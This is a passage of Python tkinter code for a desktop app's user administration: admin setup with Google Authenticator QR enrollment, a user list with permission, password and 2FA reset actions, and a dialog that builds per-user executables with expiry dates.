        self.user_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0,
                                    font=("Segoe UI", 11))
        self.user_entry.pack(fill="x", padx=15, ipady=8)
        
        tk.Label(form, text="Password (min 4 chars)", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(12, 2))
        self.pass_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0, show="●",
                                    font=("Segoe UI", 11))
        self.pass_entry.pack(fill="x", padx=15, ipady=8)
        
        tk.Label(form, text="Confirm Password", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(12, 2))
        self.pass2_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                     insertbackground=C["text"],
                                     relief="flat", bd=0, show="●",
                                     font=("Segoe UI", 11))
        self.pass2_entry.pack(fill="x", padx=15, ipady=8, pady=(0, 15))
        
        self.create_btn = tk.Button(self, text="✅ Create Admin",
                                     bg=C["green"], fg="white",
                                     font=("Segoe UI", 11, "bold"),
                                     relief="flat", bd=0, cursor="hand2",
                                     command=self._do_create)
        self.create_btn.pack(fill="x", padx=40, pady=10, ipady=10)
        
        self.status = tk.Label(self, text="", bg=C["bg0"], fg=C["red"],
                                font=("Segoe UI", 9))
        self.status.pack(pady=5)
        
        self.user_entry.focus()
    
    def _do_create(self):
        from tkinter import messagebox
        username = self.user_entry.get().strip()
        password = self.pass_entry.get()
        password2 = self.pass2_entry.get()
        
        if not username or not password:
            self.status.config(text="⚠ 3mer kolchi", fg=C["yellow"])
            return
        if password != password2:
            self.status.config(text="⚠ Passwords ma tewa9o", fg=C["red"])
            return
        
        try:
            success, message, secret = self.user_manager.create_user(
                username, password, role="admin")
        except Exception as e:
            self.status.config(text=f"❌ Error: {str(e)[:60]}", fg=C["red"])
            print(f"❌ Create user error: {e}")
            import traceback; traceback.print_exc()
            return
        
        if not success:
            self.status.config(text=f"❌ {message}", fg=C["red"])
            return
        
        # Show QR code — mli yssed, mark setup completed w destroy
        def _on_qr_done():
            try:
                self.parent_login._setup_completed = True
            except Exception:
                pass
            self.destroy()
        
        # Use self (SetupWindow) as parent — hia li visible
        try:
            QRCodeDialog(self, self.user_manager,
                         username, secret, on_close=_on_qr_done)
        except Exception as e:
            self.status.config(text=f"❌ QR error: {str(e)[:60]}", fg=C["red"])
            print(f"❌ QR dialog error: {e}")
            import traceback; traceback.print_exc()
            messagebox.showerror("QR Error",
                f"Failed to show QR code: {e}\n\n"
                f"User '{username}' created.\n"
                f"Manual TOTP secret: {secret}\n\n"
                f"Sauvegard had l'secret w add manuelan f Google Authenticator.",
                parent=self)
            _on_qr_done()


class QRCodeDialog(tk.Toplevel):
    """Show QR code dyal Google Authenticator"""
    
    def __init__(self, parent, user_manager, username, secret, on_close=None):
        super().__init__(parent)
        self.user_manager = user_manager
        self.username = username
        self.secret = secret
        self.on_close_cb = on_close
        
        self.title("📱 Google Authenticator Setup")
        self.geometry("520x780")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        # Release parent's grab first ila kayna
        try:
            parent.grab_release()
        except Exception:
            pass
        self.transient(parent)
        self.lift()
        self.focus_force()
        self.grab_set()
        
        # Set icon
        try:
            _icon_dir = os.path.dirname(os.path.abspath(__file__))
            _ico = os.path.join(_icon_dir, "sk_logo.ico")
            if os.path.exists(_ico):
                self.iconbitmap(_ico)
        except Exception:
            pass
        
        # Center
        self.update_idletasks()
        w, h = 520, 780
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        # Adjust if screen too small
        if h > sh - 50:
            h = sh - 50
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{max(0,(sh-h)//2)}")
        
        self._build_ui()
    
    def _build_ui(self):
        from tkinter import messagebox
        import qrcode
        from io import BytesIO
        import base64 as b64
        
        # ═══ BOTTOM AREA (button + warning) — pack LAWWL bach dima yban ═══
        bottom_frame = tk.Frame(self, bg=C["bg0"])
        bottom_frame.pack(side="bottom", fill="x", padx=30, pady=(0, 15))
        
        tk.Label(bottom_frame,
                 text="⚠ Sauvegardi had QR code wla key — ila wddertih t9der twel access!",
                 bg=C["bg0"], fg=C["yellow"],
                 font=("Segoe UI", 8), wraplength=440).pack(pady=(0, 10))
        
        tk.Button(bottom_frame, text="✅ DONE - Save QR Code",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 12, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._done).pack(fill="x", ipady=12)
        
        # ═══ TOP AREA (titles) ═══
        tk.Label(self, text="📱 Setup Google Authenticator",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(pady=(15, 3))
        tk.Label(self, text=f"User: {self.username}",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(pady=(0, 8))
        
        # ═══ MIDDLE — QR code + instructions ═══
        # Generate QR code (smaller box_size bach yKhdem mzyan)
        try:
            uri = self.user_manager.get_totp_uri(self.username, self.secret)
            qr = qrcode.QRCode(version=1, box_size=6, border=2)
            qr.add_data(uri)
            qr.make(fit=True)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            # Convert to PhotoImage via base64 PNG
            buffer = BytesIO()
            qr_img.save(buffer, format='PNG')
            self._qr_photo = tk.PhotoImage(data=b64.b64encode(buffer.getvalue()))
            
            qr_frame = tk.Frame(self, bg="white", bd=8)
            qr_frame.pack(pady=8)
            tk.Label(qr_frame, image=self._qr_photo, bg="white").pack()
        except Exception as e:
            tk.Label(self, text=f"❌ QR error: {e}",
                     bg=C["bg0"], fg=C["red"]).pack(pady=20)
        
        # Instructions
        tk.Label(self, text="📋 Steps:", bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=40, pady=(8, 2))
        steps = ("1. Loadi 'Google Authenticator' f telephonk\n"
                 "2. Click '+' → 'Scan QR code'\n"
                 "3. Scaniw had QR code\n"
                 "4. T'shof 6 digits f telephonk")
        tk.Label(self, text=steps, bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9), justify="left").pack(anchor="w", padx=40)
        
        # Manual key (backup)
        tk.Label(self, text="Wla copyer hadi key manuelan:",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(pady=(8, 2))
        secret_frame = tk.Frame(self, bg=C["bg2"])
        secret_frame.pack(padx=40, fill="x")
        tk.Label(secret_frame, text=self.secret,
                 bg=C["bg2"], fg=C["accent"],
                 font=("Consolas", 10, "bold")).pack(pady=6)
    
    def _done(self):
        from tkinter import messagebox
        messagebox.showinfo("✅ Done",
            f"User '{self.username}' created!\n\nDaba login b username + password + code mn Google Authenticator.",
            parent=self)
        self.destroy()
        if self.on_close_cb:
            self.on_close_cb()


class UsersTab(tk.Frame):
    """Tab Users (admin only) — manage users"""
    
    def __init__(self, parent, app):
        super().__init__(parent, bg=C["bg0"])
        self.app = app
        self.user_manager = app.user_manager
        self._build_ui()
        self._refresh_users()
    
    def _build_ui(self):
        # Header
        header = tk.Frame(self, bg=C["bg0"])
        header.pack(fill="x", padx=15, pady=10)
        tk.Label(header, text="👥 Users Management",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(side="left")
        
        tk.Button(header, text="➕ Add User",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._add_user).pack(side="right", padx=5, ipadx=10, ipady=5)
        tk.Button(header, text="🔄 Refresh",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 10),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._refresh_users).pack(side="right", padx=5, ipadx=10, ipady=5)
        
        # Users tree
        tree_frame = tk.Frame(self, bg=C["bg1"])
        tree_frame.pack(fill="both", expand=True, padx=15, pady=10)
        
        cols = ("username", "role", "permissions", "expires", "last_login", "created")
        self.tree = ttk.Treeview(tree_frame, columns=cols, show="headings", height=15)
        self.tree.heading("username", text="👤 Username")
        self.tree.heading("role", text="🎯 Role")
        self.tree.heading("permissions", text="🔒 Permissions")
        self.tree.heading("expires", text="⏰ Expires")
        self.tree.heading("last_login", text="🕐 Last Login")
        self.tree.heading("created", text="📅 Created")
        self.tree.column("username", width=120)
        self.tree.column("role", width=80)
        self.tree.column("permissions", width=220)
        self.tree.column("expires", width=110)
        self.tree.column("last_login", width=130)
        self.tree.column("created", width=130)
        self.tree.pack(side="left", fill="both", expand=True)
        
        sb = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        sb.pack(side="right", fill="y")
        self.tree.config(yscrollcommand=sb.set)
        
        # Double-click → edit permissions
        self.tree.bind("<Double-1>", lambda e: self._edit_permissions())
        
        # Actions
        actions = tk.Frame(self, bg=C["bg0"])
        actions.pack(fill="x", padx=15, pady=10)
        
        tk.Button(actions, text="🔒 Edit Permissions",
                  bg=C["accent2"] if "accent2" in C else "#0ea5e9", fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._edit_permissions).pack(side="left", padx=5, ipadx=10, ipady=5)
        
        tk.Button(actions, text="🔐 Reset 2FA",
                  bg=C["yellow"], fg="black",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._reset_2fa).pack(side="left", padx=5, ipadx=10, ipady=5)
        tk.Button(actions, text="🔑 Change Password",
                  bg=C["accent"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._change_password).pack(side="left", padx=5, ipadx=10, ipady=5)
        tk.Button(actions, text="🗑 Delete User",
                  bg=C["red"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._delete_user).pack(side="left", padx=5, ipadx=10, ipady=5)
        
        # 📦 Build EXE button (right side)
        tk.Button(actions, text="📦 Build EXE",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._build_exe).pack(side="right", padx=5, ipadx=15, ipady=5)
    
    def _refresh_users(self):
        for iid in self.tree.get_children():
            self.tree.delete(iid)
        # Build map: tab_id → emoji
        emoji_map = {tid: emoji for tid, _, emoji in AVAILABLE_TABS}
        name_map = {tid: name for tid, name, _ in AVAILABLE_TABS}
        from datetime import datetime
        now = int(time.time())
        for user in self.user_manager.list_users():
            last = self._fmt_time(user["last_login"]) if user["last_login"] else "Never"
            created = self._fmt_time(user["created_at"]) if user["created_at"] else "—"
            role_icon = "👑" if user["role"] == "admin" else "👤"
            
            # Format permissions
            perms = user.get("permissions", [])
            if user["role"] == "admin":
                perms_str = "🌟 ALL (admin)"
            elif len(perms) == len(AVAILABLE_TABS):
                perms_str = "✅ All tabs"
            elif not perms:
                perms_str = "❌ None"
            else:
                perms_str = " ".join(emoji_map.get(p, "?") for p in perms)
                if len(perms_str) > 28:
                    perms_str = f"{len(perms)} tabs"
            
            # Format expiration
            exp = user.get("expires_at")
            if user["role"] == "admin":
                exp_str = "♾ Never"
            elif exp is None:
                exp_str = "♾ Never"
            elif now > exp:
                exp_str = "⛔ EXPIRED"
            else:
                diff = exp - now
                if diff < 3600:  # < 1 hour → show minutes
                    mins = diff // 60
                    exp_str = f"⚠ {mins}m left"
                elif diff < 86400:  # < 1 day → show hours
                    hrs = diff // 3600
                    exp_str = f"⚠ {hrs}h left"
                elif diff < 7 * 86400:  # < 7 days → warn
                    days = diff // 86400
                    date_str = datetime.fromtimestamp(exp).strftime("%Y-%m-%d")
                    exp_str = f"⚠ {date_str} ({days}d)"
                else:
                    days = diff // 86400
                    date_str = datetime.fromtimestamp(exp).strftime("%Y-%m-%d")
                    exp_str = f"{date_str} ({days}d)"
            
            self.tree.insert("", "end", values=(
                user["username"], f"{role_icon} {user['role']}",
                perms_str, exp_str, last, created))
    
    def _fmt_time(self, ts):
        from datetime import datetime
        try:
            return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M")
        except Exception:
            return "—"
    
    def _get_selected_username(self):
        sel = self.tree.selection()
        if not sel:
            return None
        return self.tree.item(sel[0])["values"][0]
    
    def _add_user(self):
        AddUserDialog(self, self.user_manager, on_success=self._refresh_users)
    
    def _delete_user(self):
        from tkinter import messagebox
        username = self._get_selected_username()
        if not username:
            messagebox.showwarning("No Selection", "Khtar user lawl", parent=self)
            return
        if not messagebox.askyesno("Confirm Delete",
                                    f"Bsa7 baghi t7ayed user '{username}'?",
                                    parent=self):
            return
        success, msg = self.user_manager.delete_user(username)
        if success:
            messagebox.showinfo("✅", msg, parent=self)
            self._refresh_users()
        else:
            messagebox.showerror("❌", msg, parent=self)
    
    def _reset_2fa(self):
        from tkinter import messagebox
        username = self._get_selected_username()
        if not username:
            messagebox.showwarning("No Selection", "Khtar user lawl", parent=self)
            return
        if not messagebox.askyesno("Confirm Reset 2FA",
                                    f"Generate jdid QR code l '{username}'?\n"
                                    "L'9dim ghadi ymha9 ymchi.",
                                    parent=self):
            return
        success, secret = self.user_manager.reset_2fa(username)
        if success:
            QRCodeDialog(self.app, self.user_manager, username, secret)
            self._refresh_users()
        else:
            messagebox.showerror("❌", "Failed", parent=self)
    
    def _change_password(self):
        from tkinter import messagebox, simpledialog
        username = self._get_selected_username()
        if not username:
            messagebox.showwarning("No Selection", "Khtar user lawl", parent=self)
            return
        new_pwd = simpledialog.askstring("Change Password",
                                          f"Password jdid l '{username}':",
                                          show="●", parent=self)
        if not new_pwd:
            return
        success, msg = self.user_manager.change_password(username, new_pwd)
        if success:
            messagebox.showinfo("✅", msg, parent=self)
        else:
            messagebox.showerror("❌", msg, parent=self)
    
    def _edit_permissions(self):
        from tkinter import messagebox
        username = self._get_selected_username()
        if not username:
            messagebox.showwarning("No Selection", "Khtar user lawl", parent=self)
            return
        # Don't edit admin permissions (admins always have all)
        user_data = self.user_manager.users.get(username, {})
        if user_data.get("role") == "admin":
            messagebox.showinfo("👑 Admin",
                "Admin dima 3ndo kolchi — ma3ndna ma n3ddlo.\n\n"
                "Ila bghiti tnewqas l permissions, bdel role l 'user' lawl.",
                parent=self)
            return
        EditPermissionsDialog(self, self.user_manager, username,
                              on_success=self._refresh_users)
    
    def _build_exe(self):
        """📦 Build .exe wahda l user khass"""
        from tkinter import messagebox
        username = self._get_selected_username()
        if not username:
            messagebox.showwarning("No Selection",
                "Khtar user lawl mn list", parent=self)
            return
        # Open build dialog
        BuildExeDialog(self, self.user_manager, username, self.app)


class EditPermissionsDialog(tk.Toplevel):
    """Edit permissions l user existing"""
    
    def __init__(self, parent, user_manager, username, on_success=None):
        super().__init__(parent)
        self.user_manager = user_manager
        self.username = username
        self.on_success = on_success
        
        self.title(f"🔒 Edit Permissions - {username}")
        self.geometry("480x560")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        self.transient(parent)
        self.grab_set()
        
        self.update_idletasks()
        w, h = 480, 560
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        if h > sh - 50:
            h = sh - 50
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{max(0,(sh-h)//2)}")
        
        self.perm_vars = {}
        self._build_ui()
    
    def _build_ui(self):
        # Bottom button (pack lawl)
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=30, pady=(5, 15))
        
        self.status = tk.Label(bottom, text="", bg=C["bg0"], fg=C["green"],
                                font=("Segoe UI", 9))
        self.status.pack(pady=(0, 5))
        
        btn_frame = tk.Frame(bottom, bg=C["bg0"])
        btn_frame.pack(fill="x")
        tk.Button(btn_frame, text="❌ Cancel",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 10),
                  relief="flat", bd=0, cursor="hand2",
                  command=self.destroy).pack(side="left", expand=True, fill="x", padx=(0, 4), ipady=8)
        tk.Button(btn_frame, text="✅ Save",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._do_save).pack(side="left", expand=True, fill="x", padx=(4, 0), ipady=8)
        
        # Header
        tk.Label(self, text=f"🔒 Edit Permissions",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(pady=(20, 3))
        tk.Label(self, text=f"User: 👤 {self.username}",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 11, "bold")).pack()
        tk.Label(self, text="Khtar tabs li ki9der yshof",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(pady=(2, 10))
        
        # All / None buttons
        ctrl = tk.Frame(self, bg=C["bg0"])
        ctrl.pack(fill="x", padx=30)
        tk.Button(ctrl, text="✅ All", bg=C["green"], fg="white",
                  font=("Segoe UI", 9, "bold"), relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._toggle_all(True)).pack(side="left", padx=4, ipadx=15, ipady=4)
        tk.Button(ctrl, text="❌ None", bg=C["red"], fg="white",
                  font=("Segoe UI", 9, "bold"), relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._toggle_all(False)).pack(side="left", padx=4, ipadx=15, ipady=4)
        
        # Get current permissions
        current_perms = set(self.user_manager.get_permissions(self.username))
        
        # Checkboxes
        perm_frame = tk.Frame(self, bg=C["bg1"])
        perm_frame.pack(fill="x", padx=30, pady=10)
        
        for tab_id, name, emoji in AVAILABLE_TABS:
            var = tk.BooleanVar(value=(tab_id in current_perms))
            self.perm_vars[tab_id] = var
            tk.Checkbutton(perm_frame, text=f"{emoji}  {name}",
                           variable=var,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           activeforeground=C["text"],
                           font=("Segoe UI", 10),
                           anchor="w").pack(fill="x", padx=15, pady=3)
    
    def _toggle_all(self, value):
        for var in self.perm_vars.values():
            var.set(value)
    
    def _do_save(self):
        from tkinter import messagebox
        permissions = [tid for tid, var in self.perm_vars.items() if var.get()]
        
        if not permissions:
            if not messagebox.askyesno("Confirm",
                "User ma 3ndo 7etta tab. Wach katchedd?",
                parent=self):
                return
        
        success, msg = self.user_manager.set_permissions(self.username, permissions)
        if success:
            self.status.config(text=f"✅ {msg}", fg=C["green"])
            self.after(800, self.destroy)
            if self.on_success:
                self.on_success()
        else:
            self.status.config(text=f"❌ {msg}", fg=C["red"])


# ═══════════════════════════════════════════════════════════════════
# 📦 BUILD EXE DIALOG — Generate custom .exe l user khass
# ═══════════════════════════════════════════════════════════════════

class BuildExeDialog(tk.Toplevel):
    """Dialog l build .exe custom l user wahd
    Admin ki-khtar: password jdid, role, expiration, permissions
    Mn ba3d ki-générer wa7d .exe wa7do m3a kolchi configured"""
    
    def __init__(self, parent, user_manager, username, app):
        super().__init__(parent)
        self.user_manager = user_manager
        self.username = username
        self.app = app  # GmailSenderApp reference
        
        self.title(f"📦 Build EXE - {username}")
        self.geometry("600x780")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        self.transient(parent)
        self.grab_set()
        
        self.update_idletasks()
        w, h = 600, 780
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        if h > sh - 50:
            h = sh - 50
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{max(0,(sh-h)//2)}")
        
        self.perm_vars = {}
        self.is_building = False
        self._build_ui()
    
    def _build_ui(self):
        # ═══ BOTTOM BUTTONS (pack lawl) ═══
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=20, pady=(5, 15))
        
        self.status = tk.Label(bottom, text="", bg=C["bg0"], fg=C["text2"],
                                font=("Segoe UI", 9), wraplength=560)
        self.status.pack(pady=(0, 8))
        
        btn_row = tk.Frame(bottom, bg=C["bg0"])
        btn_row.pack(fill="x")
        
        self.cancel_btn = tk.Button(btn_row, text="❌ Cancel",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 10),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._on_cancel)
        self.cancel_btn.pack(side="left", expand=True, fill="x", padx=(0, 4), ipady=10)
        
        self.build_btn = tk.Button(btn_row, text="📦 GENERATE BUILD",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 11, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._do_build)
        self.build_btn.pack(side="left", expand=True, fill="x", padx=(4, 0), ipady=10)
        
        # ═══ HEADER ═══
        tk.Label(self, text="📦 Build Custom EXE",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack(pady=(15, 3))
        tk.Label(self, text=f"Generate package l user: 👤 {self.username}",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10)).pack()
        tk.Label(self, text="L'user ghadi yakhd .exe + QR code, ma 7tahch installation",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(pady=(2, 12))
        
        # ═══ FORM ═══
        form = tk.Frame(self, bg=C["bg1"])
        form.pack(fill="x", padx=20, pady=5)
        
        # Password (jdid wla nfs l'qdim)
        pwd_row = tk.Frame(form, bg=C["bg1"])
        pwd_row.pack(fill="x", padx=15, pady=(12, 4))
        tk.Label(pwd_row, text="🔒 New Password (l user)",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left")
        tk.Label(pwd_row, text="(❗ ki-bdel l'qdim)",
                 bg=C["bg1"], fg=C["yellow"],
                 font=("Segoe UI", 8)).pack(side="left", padx=(8, 0))
        
        self.pass_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0,
                                    font=("Segoe UI", 11))
        self.pass_entry.pack(fill="x", padx=15, ipady=7)
        
        # Role
        role_row = tk.Frame(form, bg=C["bg1"])
        role_row.pack(fill="x", padx=15, pady=(10, 0))
        tk.Label(role_row, text="🎯 Role", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left")
        
        # Get current role
        current_role = self.user_manager.users.get(self.username, {}).get("role", "user")
        self.role_var = tk.StringVar(value=current_role)
        for role, icon in [("user", "👤"), ("admin", "👑")]:
            tk.Radiobutton(role_row, text=f"{icon} {role}",
                           variable=self.role_var, value=role,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           activeforeground=C["text"],
                           font=("Segoe UI", 10),
                           command=self._on_role_change).pack(side="left", padx=8)
        
        # Expiration
        exp_row = tk.Frame(form, bg=C["bg1"])
        exp_row.pack(fill="x", padx=15, pady=(10, 0))
        tk.Label(exp_row, text="📅 Expiration", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left")
        
        # Expiration: presets
        self.exp_var = tk.StringVar(value="30")
        for days, label in [("7", "7 days"), ("30", "30 days"), ("90", "90 days"),
                             ("365", "1 year"), ("0", "♾ Never")]:
            tk.Radiobutton(exp_row, text=label,
                           variable=self.exp_var, value=days,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           activeforeground=C["text"],
                           font=("Segoe UI", 9)).pack(side="left", padx=4)
        
        # Custom: number + unit (minutes/hours/days)
        custom_row = tk.Frame(form, bg=C["bg1"])
        custom_row.pack(fill="x", padx=15, pady=(4, 12))
        tk.Label(custom_row, text="Custom:", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left")
        self.exp_custom = tk.Entry(custom_row, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0,
                                    font=("Segoe UI", 10), width=6)
        self.exp_custom.pack(side="left", padx=6, ipady=4)
        
        self.exp_unit = tk.StringVar(value="minutes")
        unit_options = [("minutes", "⏱ minutes"),
                        ("hours", "🕐 hours"),
                        ("days", "📅 days")]
        for val, label in unit_options:
            tk.Radiobutton(custom_row, text=label,
                           variable=self.exp_unit, value=val,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           activeforeground=C["text"],
                           font=("Segoe UI", 9)).pack(side="left", padx=2)
        tk.Label(custom_row, text="← khali fragh ila bghiti preset",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(side="left", padx=4)
        
        # 📱 2FA option
        tfa_row = tk.Frame(form, bg=C["bg1"])
        tfa_row.pack(fill="x", padx=15, pady=(0, 12))
        tk.Label(tfa_row, text="📱 Google Auth:", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left")
        
        # Default: keep current QR (l'user 3ndou QR mn 9bel)
        self.tfa_var = tk.StringVar(value="keep")
        tk.Radiobutton(tfa_row, text="🔒 Keep current QR (l'user 3ndou)",
                       variable=self.tfa_var, value="keep",
                       bg=C["bg1"], fg=C["text"],
                       selectcolor=C["bg2"],
                       activebackground=C["bg1"],
                       activeforeground=C["text"],
                       font=("Segoe UI", 9)).pack(side="left", padx=6)
        tk.Radiobutton(tfa_row, text="🔄 Generate new QR",
                       variable=self.tfa_var, value="new",
                       bg=C["bg1"], fg=C["text"],
                       selectcolor=C["bg2"],
                       activebackground=C["bg1"],
                       activeforeground=C["text"],
                       font=("Segoe UI", 9)).pack(side="left", padx=6)
        
        # ═══ PERMISSIONS ═══
        perm_header = tk.Frame(self, bg=C["bg0"])
        perm_header.pack(fill="x", padx=20, pady=(10, 4))
        tk.Label(perm_header, text="🔒 Permissions (tabs li ki-yshof l'user)",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(side="left")
        
        btn_frame = tk.Frame(perm_header, bg=C["bg0"])
        btn_frame.pack(side="right")
        tk.Button(btn_frame, text="All", bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 8), relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._toggle_all(True)).pack(side="left", padx=2, ipadx=8)
        tk.Button(btn_frame, text="None", bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 8), relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._toggle_all(False)).pack(side="left", padx=2, ipadx=8)
        
        # Get current permissions
        current_perms = set(self.user_manager.get_permissions(self.username))
        
        perm_frame = tk.Frame(self, bg=C["bg1"])
        perm_frame.pack(fill="x", padx=20, pady=(0, 5))
        
        # 2-column grid pour gain de place
        col1 = tk.Frame(perm_frame, bg=C["bg1"])
        col1.pack(side="left", fill="both", expand=True, padx=15, pady=8)
        col2 = tk.Frame(perm_frame, bg=C["bg1"])
        col2.pack(side="left", fill="both", expand=True, padx=15, pady=8)
        
        for i, (tab_id, name, emoji) in enumerate(AVAILABLE_TABS):
            var = tk.BooleanVar(value=(tab_id in current_perms))
            self.perm_vars[tab_id] = var
            target = col1 if i < (len(AVAILABLE_TABS) + 1) // 2 else col2
            tk.Checkbutton(target, text=f"{emoji}  {name}",
                           variable=var,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           activeforeground=C["text"],
                           font=("Segoe UI", 10),
                           anchor="w").pack(fill="x", pady=2)
        
        # ═══ INFO ═══
        info_frame = tk.Frame(self, bg=C["bg2"])
        info_frame.pack(fill="x", padx=20, pady=(8, 0))
        tk.Label(info_frame,
                 text="💡 ach ghadi yji f l'output:\n"
                      "   📦 SK_PRO_USERNAME.exe (l'app)\n"
                      "   📱 USERNAME_QR.png (Google Authenticator QR)\n"
                      "   📄 USERNAME_README.txt (instructions l user)",
                 bg=C["bg2"], fg=C["text2"],
                 font=("Consolas", 8), justify="left").pack(padx=10, pady=8, anchor="w")
    
    def _on_role_change(self):
        if self.role_var.get() == "admin":
            self._toggle_all(True)
    
    def _toggle_all(self, value):
        for var in self.perm_vars.values():
            var.set(value)
    
    def _on_cancel(self):
        if self.is_building:
            from tkinter import messagebox
            if not messagebox.askyesno("Confirm",
                "Build kheddam — bsa7 baghi tcancel?", parent=self):
                return
        self.destroy()
    
    def _do_build(self):
        """Generate l'package kaml"""
        from tkinter import messagebox
        import threading
        
        if self.is_building:
            return
        
        # Validate inputs
        password = self.pass_entry.get()
        if not password or len(password) < 4:
            self.status.config(text="❌ Password mn 4 chars 3la l'a9al", fg=C["red"])
            return
        
        role = self.role_var.get()
        permissions = [tid for tid, var in self.perm_vars.items() if var.get()]
        
        if role == "user" and not permissions:
            self.status.config(text="❌ Khtar 3la l'a9al wa7d tab", fg=C["red"])
            return
        
        # Calculate expiration
        custom_value = self.exp_custom.get().strip()
        if custom_value:
            try:
                amount = int(custom_value)
                if amount <= 0:
                    expires_at = None
                else:
                    unit = self.exp_unit.get()
                    if unit == "minutes":
                        seconds = amount * 60
                    elif unit == "hours":
                        seconds = amount * 3600
                    else:  # days
                        seconds = amount * 86400
                    expires_at = int(time.time()) + seconds
            except ValueError:
                self.status.config(text="❌ Custom khasso integer (3dad)", fg=C["red"])
                return
        else:
            preset = self.exp_var.get()
            if preset == "0":
                expires_at = None
            else:
                expires_at = int(time.time()) + (int(preset) * 86400)
        
        # Confirm
        from datetime import datetime
        if expires_at is None:
            exp_str = "♾ Never"
        else:
            exp_dt = datetime.fromtimestamp(expires_at)
            now = int(time.time())
            diff = expires_at - now
            if diff < 3600:
                exp_str = f"{exp_dt.strftime('%Y-%m-%d %H:%M')} ({diff//60} minutes)"
            elif diff < 86400:
                exp_str = f"{exp_dt.strftime('%Y-%m-%d %H:%M')} ({diff//3600} hours)"
            else:
                exp_str = f"{exp_dt.strftime('%Y-%m-%d')} ({diff//86400} days)"
        
        confirm_msg = (f"📦 Build dyal '{self.username}':\n\n"
                       f"   Role: {role}\n"
